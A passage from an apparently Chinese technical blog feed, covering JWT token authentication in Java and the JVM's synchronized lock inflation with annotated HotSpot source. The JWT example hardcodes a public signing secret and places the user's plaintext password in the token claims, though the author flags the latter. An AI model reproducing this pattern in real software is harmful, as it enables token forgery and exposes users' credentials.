        <content type="html"><![CDATA[<h2 id="关于token-在web中的使用"><a href="#关于token-在web中的使用" class="headerlink" title="关于token 在web中的使用"></a>关于token 在web中的使用</h2> <a id="more"></a><h2 id="客户端认证"><a href="#客户端认证" class="headerlink" title="客户端认证"></a>客户端认证</h2><p>token不存储到服务器任何地方, 只提供给服务端解密 并通过验证, 就认为是合法的 , 比如jwt</p><h3 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h3><p>使用在客户量特别大的时候</p><h4 id="使用示例"><a href="#使用示例" class="headerlink" title="使用示例"></a>使用示例</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.cloud.util.token;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.auth0.jwt.JWT;</span><br><span class="line"><span class="keyword">import</span> com.auth0.jwt.JWTVerifier;</span><br><span class="line"><span class="keyword">import</span> com.auth0.jwt.algorithms.Algorithm;</span><br><span class="line"><span class="keyword">import</span> com.auth0.jwt.interfaces.DecodedJWT;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> badpoone</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JWTTokenUtil</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *     过期时间</span></span><br><span class="line"><span class="comment">     *     static final 静态, 无法改变,必须初始化</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> EXPIRE_DATE=<span class="number">30</span>*<span class="number">60</span>*<span class="number">100000</span>;</span><br><span class="line">    <span class="comment">//利用随机数生成 tokenSecret  保存到缓存</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String TOKEN_SECRET = <span class="string">"ZCfashuaUUhufgudddadadadaeER"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">token</span><span class="params">(String username, String password)</span></span>&#123;</span><br><span class="line">        String token = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//过期时间</span></span><br><span class="line">            Date date = <span class="keyword">new</span> Date(System.currentTimeMillis()+EXPIRE_DATE);</span><br><span class="line">            <span class="comment">//密钥以及加密算法</span></span><br><span class="line">            Algorithm algorithm = Algorithm.HMAC256(TOKEN_SECRET);</span><br><span class="line">            <span class="comment">//设置 头部信息</span></span><br><span class="line">            Map&lt;String,Object&gt; header= <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">            <span class="comment">//携带username, password 信息, 生成签名</span></span><br><span class="line">            token = JWT.create()</span><br><span class="line">                    .withHeader(header)</span><br><span class="line">                    .withClaim(<span class="string">"username"</span>,username)</span><br><span class="line">                    .withClaim(<span class="string">"password"</span>,password)</span><br><span class="line">                    .sign(algorithm);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> token;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">verify</span><span class="params">(String token)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Algorithm algorithm=Algorithm.HMAC256(TOKEN_SECRET);</span><br><span class="line">            JWTVerifier verifier = JWT.require(algorithm).build();</span><br><span class="line">            DecodedJWT jwt = verifier.verify(token);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String username =<span class="string">"name1"</span>;</span><br><span class="line">        String password = <span class="string">"pw1"</span>;</span><br><span class="line">        <span class="comment">//注意，一般不会把密码等私密信息放在payload中，这边只是举个列子</span></span><br><span class="line">        String token = token(username,password);</span><br><span class="line">        System.out.println(token);</span><br><span class="line">        <span class="keyword">boolean</span> b = verify(token);</span><br><span class="line">        System.out.println(b);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="关于JWT的安全问题"><a href="#关于JWT的安全问题" class="headerlink" title="关于JWT的安全问题"></a>关于JWT的安全问题</h4><p>JWT token 的关键过程点就是密钥, 加入这个密钥泄露了, 那么基本就可以伪造token了 </p><p>这一点可以在用户登陆时 利用随机数生成token的TOKEN_SECRET , 并保存到缓存, key是登陆账户 , 客户端</p><p>访问接口是 : header要带登陆账号 和 token ,服务端拿到登录账号，到缓存去捞相应的SecretKey ，然后再进行token校验。可以防伪造token了（这个方案在一定程度上能防止伪造</p><p>，但是不能防止token泄露被劫持）</p><h4 id="使用-JWT进行用户认证及Token的刷个牙续保"><a href="#使用-JWT进行用户认证及Token的刷个牙续保" class="headerlink" title="使用 JWT进行用户认证及Token的刷个牙续保"></a>使用 JWT进行用户认证及Token的刷个牙续保</h4><h2 id="服务端认证"><a href="#服务端认证" class="headerlink" title="服务端认证"></a>服务端认证</h2>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>java/Synchronized</title>
      <link href="java/Synchronized/"/>
      <url>java/Synchronized/</url>
      
        <content type="html"><![CDATA[<h2 id="Synchroized-关键字-及锁机制优化"><a href="#Synchroized-关键字-及锁机制优化" class="headerlink" title="Synchroized 关键字 及锁机制优化"></a>Synchroized 关键字 及锁机制优化</h2><a id="more"></a><h2 id="锁与对象头"><a href="#锁与对象头" class="headerlink" title="锁与对象头"></a>锁与对象头</h2><p>java 中 Synchoronized 锁住的是的对象 </p><p>贯穿全文的为mark word </p><p><img src="../images/Synchronized/image-20210608144215440.png" alt="image-20210608144215440"></p><p>(cms_free 1.6后移出)</p><p>ark Word在64位虚拟机下，也就是占用64位大小即8个字节的空间.</p><p>内具体容包括：</p><ul><li>unused：未使用的</li><li>hashcode：上文提到的<strong>identity</strong> hash code，本文出现的hashcode都是指identity hash code</li><li>thread: 偏向锁记录的线程标识</li><li>epoch: 验证偏向锁有效性的时间戳</li><li>age：分代年龄</li><li>biased_lock 偏向锁标志</li><li>lock 锁标志</li><li>pointer_to_lock_record 轻量锁lock record指针</li><li>pointer_to_heavyweight_monitor 重量锁monitor指针</li></ul><p>所有锁的状态如下</p><p><img src="../images/Synchronized/image-20210608145725658.png" alt="image-20210608145725658"></p><h3 id="对象内存布局查看工具-JOL"><a href="#对象内存布局查看工具-JOL" class="headerlink" title="对象内存布局查看工具-JOL"></a>对象内存布局查看工具-JOL</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- https:&#x2F;&#x2F;mvnrepository.com&#x2F;artifact&#x2F;org.openjdk.jol&#x2F;jol-core --&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;org.openjdk.jol&lt;&#x2F;groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;jol-core&lt;&#x2F;artifactId&gt;</span><br><span class="line">  &lt;version&gt;0.9&lt;&#x2F;version&gt;</span><br><span class="line">&lt;&#x2F;dependency&gt;</span><br></pre></td></tr></table></figure><p>测试程序如下</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">@Test  </span><br><span class="line">   public void test01<span class="literal">()</span> throws Exception&#123;</span><br><span class="line">       Object o1 = <span class="keyword">new</span> <span class="constructor">Object()</span>;</span><br><span class="line">       <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(<span class="module-access"><span class="module"><span class="identifier">ClassLayout</span>.</span></span>parse<span class="constructor">Instance(<span class="params">o1</span>)</span>.<span class="keyword">to</span><span class="constructor">Printable()</span>);  <span class="comment">// 不加锁 </span></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>打印结果如下</p><p><img src="../images/Synchronized/image-20210608114909417.png" alt="image-20210608114909417"></p><p><strong><em>打印结果是一道高级的面试题哦：Object obj = new Object()初始化出的obj对象，在内存中占用多少字节？\</em></strong>大家还可尝试声明一个类，分别加上boolean、Boolean、int、Integer、数组、引用对象等成员变量，打印出的结果便可观看出该类型在Java中到底占多少字节。</p><p>修改为打印String 类型的对象</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">@Test</span><br><span class="line">  public void test01<span class="literal">()</span> throws Exception&#123;</span><br><span class="line">      Object o1 = <span class="keyword">new</span> <span class="constructor">Object()</span>;</span><br><span class="line">      String o2 = <span class="keyword">new</span> <span class="constructor">String(<span class="string">"fafafa"</span>)</span>;</span><br><span class="line">      <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(<span class="module-access"><span class="module"><span class="identifier">ClassLayout</span>.</span></span>parse<span class="constructor">Instance(<span class="params">o2</span>)</span>.<span class="keyword">to</span><span class="constructor">Printable()</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><img src="../images/Synchronized/image-20210608115200562.png" alt="image-20210608115200562"></p><p>一个含有属性的user类 </p><p><img src="../images/Synchronized/image-20210608120439828.png" alt="image-20210608120439828"></p><p>一个object 类为16字节 ,  四个String 变量为16字节 </p><p>对象size: 32 字节 </p><p>8字节的mark</p><h4 id="对加synchronized-的方法进行对象内存查看"><a href="#对加synchronized-的方法进行对象内存查看" class="headerlink" title="对加synchronized 的方法进行对象内存查看"></a>对加synchronized 的方法进行对象内存查看</h4><p><img src="../images/Synchronized/image-20210608124234715.png" alt="image-20210608124234715"></p><p><img src="../images/Synchronized/v2-eca382c5b933670007c1f206f70e4c31_720w.jpg" alt="img"></p><p>其中2 bit 的锁标志位 表示锁的状态, 1bit 的偏向锁标志位表示是否偏向 (下文位为重点锁膨胀过程 )</p><ol><li>当对象初始化后，还未有任何线程来竞争，此时为无锁状态。其中<code>锁标志位</code>为<strong>01</strong>，<code>偏向锁标志位</code>为<strong>0</strong></li><li>当有一个线程来竞争锁，锁对象第一次被线程获取时，<code>锁标志位</code>依然为<strong>01</strong>，<code>偏向锁标志位</code>会被置为1，此时锁进入偏向模式。同时，使用CAS操作将此获取锁对象的线程ID设置到锁对象的Mark Word中，持有偏向锁，下次再可直接进入。</li><li>此时，线程B尝试获取锁，发现锁处于偏向模式，但Mark Word中存储的不是本线程ID。那么线程B使用CAS操作尝试获取锁，这时锁是有可能获取成功的，因为上一个持有偏向锁的线程不会主动释放偏向锁。如果线程B获取锁成功，则会将Mark Word中的线程ID设置为本线程的ID。但若线程B获取锁失败，则会执行下述操作。</li><li>偏向锁抢占失败，表明锁对象存在竞争，则会先撤销偏向模式，<code>偏向锁标志位</code>重新被置为<strong>0</strong>，准备升级轻量级锁。首先将在当前线程的帧栈中开辟一块锁记录空间（Lock Record），用于存储锁对象当前的Mark Word拷贝。然后，使用CAS操作尝试把锁对象的Mark Word更新为指向帧栈中Lock Record的指针，CAS操作成功，则代表获取到锁，同时将<code>锁标志位</code>设置为<strong>00</strong>，进入轻量级锁模式。若CAS操作失败，则进入下述操作。</li><li>刚一出现CAS竞争轻量级锁失败时，不会立即膨胀为重量级锁，而是采用<strong>自旋</strong>的方式，不断重试，尝试抢锁。JDK1.6中，默认开启自旋，自旋10次，可通过-XX:PreBlockSpin更改自旋次数。JDK1.6对于只能指定固定次数的自旋进行了优化，采用了<strong>自适应的自旋</strong>，重试机制更加智能。</li><li>只有通过自旋依然获取不到锁的情况，表明锁竞争较为激烈，不再适合额外的CAS操作消耗CPU资源，则直接膨胀为重量级锁，<code>锁标志位</code>设置为<strong>10</strong>。在此状态下，所有等待锁的线程都必须进入阻塞状态。</li></ol><p><img src="../images/Synchronized/image-20210608124304713.png" alt="image-20210608124304713"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span>  <span class="keyword">void</span> <span class="title">test02</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">      Object lock = <span class="keyword">new</span> Object();</span><br><span class="line">      System.out.println(<span class="string">"枷锁时"</span>);</span><br><span class="line">      <span class="keyword">synchronized</span> (lock)&#123;</span><br><span class="line">          <span class="comment">//</span></span><br><span class="line">          String layout = ClassLayout.parseInstance(lock).toPrintable();</span><br><span class="line">          System.out.println(layout);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      System.out.println(<span class="string">"*********************释放锁后*"</span>);</span><br><span class="line">      String layout2 = ClassLayout.parseInstance(lock).toPrintable();</span><br><span class="line">      System.out.println(layout2);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><img src="../images/Synchronized/image-20210608125223843.png" alt="image-20210608125223843"> </p><p><code>synchronized</code>修饰代码块时，会产生<code>mointerenter</code>和<code>mointerexit</code>指令。那么，jvm是如何通过这两个指令来搞定加锁的呢？下面我们一步步跟踪openjdk源码中，如何实现的<code>mointerenter</code>和<code>mointerexit</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 解释器的同步代码被分解出来，以便方法调用和同步快可以共享使用</span></span><br><span class="line"><span class="comment">// The interpreter's synchronization code is factored out so that it can</span></span><br><span class="line"><span class="comment">// be shared by method invocation and synchronized blocks.</span></span><br><span class="line"><span class="comment">//%note synchronization_3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//%note monitor_1 monitorenter同步锁加锁方法</span></span><br><span class="line">IRT_ENTRY_NO_ASYNC(<span class="keyword">void</span>, InterpreterRuntime::monitorenter(JavaThread* thread, BasicObjectLock* elem))</span><br><span class="line">#ifdef ASSERT</span><br><span class="line">  thread-&gt;last_frame().interpreter_frame_verify_monitor(elem);</span><br><span class="line">#endif</span><br><span class="line">  <span class="keyword">if</span> (PrintBiasedLockingStatistics) &#123; <span class="comment">// 打印偏向锁的统计</span></span><br><span class="line">    Atomic::inc(BiasedLocking::slow_path_entry_count_addr());</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function">Handle <span class="title">h_obj</span><span class="params">(thread, elem-&gt;obj()</span>)</span>;</span><br><span class="line">  <span class="keyword">assert</span>(Universe::heap()-&gt;is_in_reserved_or_null(h_obj()),</span><br><span class="line">         <span class="string">"must be NULL or an object"</span>);</span><br><span class="line">  <span class="keyword">if</span> (UseBiasedLocking) &#123; <span class="comment">// 如果开启了偏向模式</span></span><br><span class="line">    <span class="comment">// Retry fast entry if bias is revoked to avoid unnecessary inflation</span></span><br><span class="line">    <span class="comment">// 请快速重试进入，如果偏向锁被取消以避免不必要的膨胀</span></span><br><span class="line">    ObjectSynchronizer::fast_enter(h_obj, elem-&gt;lock(), <span class="keyword">true</span>, CHECK);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 没开启偏向模式的，则调用slow_enter方法进入轻/重量级锁</span></span><br><span class="line">    ObjectSynchronizer::slow_enter(h_obj, elem-&gt;lock(), CHECK);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">assert</span>(Universe::heap()-&gt;is_in_reserved_or_null(elem-&gt;obj()),</span><br><span class="line">         <span class="string">"must be NULL or an object"</span>);</span><br><span class="line">#ifdef ASSERT</span><br><span class="line">  thread-&gt;last_frame().interpreter_frame_verify_monitor(elem);</span><br><span class="line">#endif</span><br><span class="line">IRT_END</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//%note monitor_1  monitorexit同步锁的释放锁方法</span></span><br><span class="line">IRT_ENTRY_NO_ASYNC(<span class="keyword">void</span>, InterpreterRuntime::monitorexit(JavaThread* thread, BasicObjectLock* elem))</span><br><span class="line">#ifdef ASSERT</span><br><span class="line">  thread-&gt;last_frame().interpreter_frame_verify_monitor(elem);</span><br><span class="line">#endif</span><br><span class="line">  <span class="function">Handle <span class="title">h_obj</span><span class="params">(thread, elem-&gt;obj()</span>)</span>;</span><br><span class="line">  <span class="keyword">assert</span>(Universe::heap()-&gt;is_in_reserved_or_null(h_obj()),</span><br><span class="line">         <span class="string">"must be NULL or an object"</span>);</span><br><span class="line">  <span class="keyword">if</span> (elem == NULL || h_obj()-&gt;is_unlocked()) &#123;</span><br><span class="line">    THROW(vmSymbols::java_lang_IllegalMonitorStateException());</span><br><span class="line">  &#125;</span><br><span class="line">  ObjectSynchronizer::slow_exit(h_obj(), elem-&gt;lock(), thread);</span><br><span class="line">  <span class="comment">// Free entry. This must be done here, since a pending exception might be installed on</span></span><br><span class="line">  <span class="comment">// exit. If it is not cleared, the exception handling code will try to unlock the monitor again.</span></span><br><span class="line">  elem-&gt;set_obj(NULL);</span><br><span class="line">#ifdef ASSERT</span><br><span class="line">  thread-&gt;last_frame().interpreter_frame_verify_monitor(elem);</span><br><span class="line">#endif</span><br><span class="line">IRT_END</span><br></pre></td></tr></table></figure><h3 id="jdk源码中fast-enter-和-slow-enter方法"><a href="#jdk源码中fast-enter-和-slow-enter方法" class="headerlink" title="jdk源码中fast_enter 和 slow_enter方法"></a>jdk源码中fast_enter 和 slow_enter方法</h3><p>仔细阅读上文中对于锁膨胀过程的介绍 </p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// -----------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// Monitor快速Enter/Exit的方法，解释器和编译器使用了一些汇编语言在其中。如果一下的函数被更改，请确保更新他们。实现方式对竟态条件及其敏感，务必小心。</span></span><br><span class="line"><span class="comment">//  Fast Monitor Enter/Exit</span></span><br><span class="line"><span class="comment">// This the fast monitor enter. The interpreter and compiler use</span></span><br><span class="line"><span class="comment">// some assembly copies of this code. Make sure update those code</span></span><br><span class="line"><span class="comment">// if the following function is changed. The implementation is</span></span><br><span class="line"><span class="comment">// extremely sensitive to race condition. Be careful.</span></span><br><span class="line"></span><br><span class="line">void ObjectSynchronizer::fast_enter(Handle obj, BasicLock* lock, bool attempt_rebias, TRAPS) &#123;</span><br><span class="line"> <span class="keyword">if</span> (UseBiasedLocking) &#123;<span class="comment">// 又判断了一遍是否使用偏向模式</span></span><br><span class="line">    <span class="keyword">if</span> (!SafepointSynchronize::is_at_safepoint()) &#123;<span class="comment">// 确保当前不在安全点</span></span><br><span class="line">      <span class="comment">// 偏向锁加锁：revoke_and_rebias</span></span><br><span class="line">      BiasedLocking::Condition cond = BiasedLocking::revoke_and_rebias(obj, attempt_rebias, THREAD);</span><br><span class="line">      <span class="keyword">if</span> (cond == BiasedLocking::BIAS_REVOKED_AND_REBIASED) &#123;</span><br><span class="line">        return;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      assert(!attempt_rebias, <span class="string">"can not rebias toward VM thread"</span>);</span><br><span class="line">      BiasedLocking::revoke_at_safepoint(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="title">assert</span>(!obj-&gt;</span><span class="function"><span class="title">mark</span>()-&gt;</span>has_bias_pattern(), <span class="string">"biases should be revoked by now"</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="comment">// 快速加锁未成功时，采用慢加锁的方式</span></span><br><span class="line"> slow_enter (obj, lock, THREAD) ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void ObjectSynchronizer::fast_exit(oop object, BasicLock* lock, TRAPS) &#123;</span><br><span class="line">  <span class="comment">// 从下面这个断言遍可得知：偏向锁不会进入快锁解锁方法。</span></span><br><span class="line">  <span class="function"><span class="title">assert</span>(!object-&gt;</span><span class="function"><span class="title">mark</span>()-&gt;</span>has_bias_pattern(), <span class="string">"should not see bias pattern here"</span>);</span><br><span class="line">  <span class="comment">// displaced header是升级轻量级锁过程中，用于存储锁对象MarkWord的拷贝，官方为这份拷贝加了一个Displaced前缀。可参考：《深入理解Java虚拟机》第三版482页的介绍。</span></span><br><span class="line">  <span class="comment">// 如果displaced header是空，先前的加锁便是重量级锁</span></span><br><span class="line">  <span class="comment">// if displaced header is null, the previous enter is recursive enter, no-op</span></span><br><span class="line">  <span class="function"><span class="title">markOop</span> dhw = lock-&gt;</span>displaced_header();</span><br><span class="line">  markOop mark ;</span><br><span class="line">  <span class="keyword">if</span> (dhw == NULL) &#123;</span><br><span class="line">     <span class="comment">// Recursive stack-lock. 递归堆栈锁</span></span><br><span class="line">     <span class="comment">// Diagnostics -- Could be: stack-locked, inflating, inflated. 断定应该是：堆栈锁、膨胀中、已膨胀（重量级锁）</span></span><br><span class="line">     <span class="function"><span class="title">mark</span> = object-&gt;</span>mark() ;</span><br><span class="line">     <span class="function"><span class="title">assert</span> (!mark-&gt;</span>is_neutral(), <span class="string">"invariant"</span>) ;</span><br><span class="line">     <span class="function"><span class="title">if</span> (mark-&gt;</span>has_locker() &amp;&amp; mark != markOopDesc::INFLATING()) &#123;</span><br><span class="line">        <span class="function"><span class="title">assert</span>(THREAD-&gt;</span><span class="function"><span class="title">is_lock_owned</span>((address)mark-&gt;</span>locker()), <span class="string">"invariant"</span>) ;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="function"><span class="title">if</span> (mark-&gt;</span>has_monitor()) &#123;</span><br><span class="line">        O<span class="function"><span class="title">bjectMonitor</span> * m = mark-&gt;</span>monitor() ;</span><br><span class="line">        <span class="function"><span class="title">assert</span>(((oop)(m-&gt;</span><span class="function"><span class="title">object</span>()))-&gt;</span>mark() == mark, <span class="string">"invariant"</span>) ;</span><br><span class="line">        <span class="function"><span class="title">assert</span>(m-&gt;</span>is_entered(THREAD), <span class="string">"invariant"</span>) ;</span><br><span class="line">     &#125;</span><br><span class="line">     return ;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="title">mark</span> = object-&gt;</span>mark() ; <span class="comment">// 锁对象头的MarkWord</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 此处为轻量级锁的释放过程，使用CAS方式解锁（下述方法中的cmpxchg_ptr即CAS操作）。</span></span><br><span class="line">  <span class="comment">// 如果对象被当前线程堆栈锁定，请尝试将displaced header和锁对象中的MarkWord替换回来。</span></span><br><span class="line">  <span class="comment">// If the object is stack-locked by the current thread, try to</span></span><br><span class="line">  <span class="comment">// swing the displaced header from the box back to the mark.</span></span><br><span class="line">  <span class="keyword">if</span> (mark == (markOop) lock) &#123;</span><br><span class="line">     <span class="function"><span class="title">assert</span> (dhw-&gt;</span>is_neutral(), <span class="string">"invariant"</span>) ;</span><br><span class="line">     <span class="function"><span class="title">if</span> ((markOop) Atomic::cmpxchg_ptr (dhw, object-&gt;</span>mark_addr(), mark) == mark) &#123;</span><br><span class="line">        TEVENT (fast_exit: release stacklock) ;</span><br><span class="line">        return;</span><br><span class="line">     &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span 